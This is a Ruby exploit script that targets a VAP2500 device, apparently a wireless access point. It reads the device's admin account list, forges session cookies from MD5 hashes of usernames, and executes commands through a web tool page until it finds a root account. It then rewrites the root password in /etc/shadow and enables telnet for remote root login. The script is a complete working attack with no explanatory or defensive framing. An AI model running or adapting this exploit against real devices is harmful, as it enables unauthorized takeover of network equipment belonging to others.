#!/usr/bin/env ruby

require 'net/http'
require 'digest/md5'

if !ARGV[0]
  puts "Usage: #{$0} <vap2500_ip_address>"
  exit(0)
end

host = ARGV[0]
new_pass = "h4x0r3d!"

http = Net::HTTP.new(host).start
users = nil
users = http.request_get("/admin.conf").body.split("\n").map! {|user| user.sub(/^(.*?),.*$/,"\\1")}

if users
  puts "[*] found user accounts: #{users.inspect}"
  puts "[*] checking for root privs"
else
  puts "[!!!] could not find any user accounts. exiting."
  exit(-1)
end

root_privs = nil
users.each {|user|
  if http.request_post("/tools_command.php","cmb_header=&txt_command=whoami",{"Cookie" => "p=#{Digest::MD5.hexdigest(user)}"}).body =~ /root/
    puts "[*] root privs found: #{user}"
    root_privs = user
    break
  end
}

if !root_privs
  puts "[!!!] could not find a root priv account. exiting."
  exit(-1)
end

puts "[*] modifying root password"
new_hash = new_pass.crypt("$1$#{new_pass}$").gsub("$","\\$")
http.request_post("/tools_command.php","cmb_header=&txt_command=sed -i -r \"s/root:[^:]*:(.*)/root:#{new_hash}:\\1/g\" /etc/shadow",{"Cookie" => "p=#{Digest::MD5.hexdigest(root_privs)}"})

puts "[*] enabling telnet"
if http.request_post("/tools_command.php","cmb_header=&txt_command=rm /mnt/jffs2/telnet-disabled; sh /etc/init.d/S42inetd start",{"Cookie" => "p=#{Digest::MD5.hexdigest(root_privs)}"}).body =~ /Starting inetd/
  puts "[*] success! telnet to #{host} (user:root pass:#{new_pass})"
else
  puts "[!!!] couldn't start telnet"
end